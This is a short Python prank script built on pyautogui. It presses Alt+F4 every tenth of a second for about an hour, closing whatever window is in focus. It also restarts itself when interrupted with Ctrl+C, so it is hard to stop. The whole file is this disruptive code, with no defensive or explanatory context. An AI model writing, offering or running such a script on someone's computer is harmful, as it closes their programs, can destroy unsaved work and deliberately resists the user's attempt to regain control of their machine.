import pyautogui
import time
def lol():
    try:
        for i in range(36000):
            pyautogui.hotkey("alt", "f4")
            time.sleep(0.1)
    except KeyboardInterrupt:
        lol()
lol()
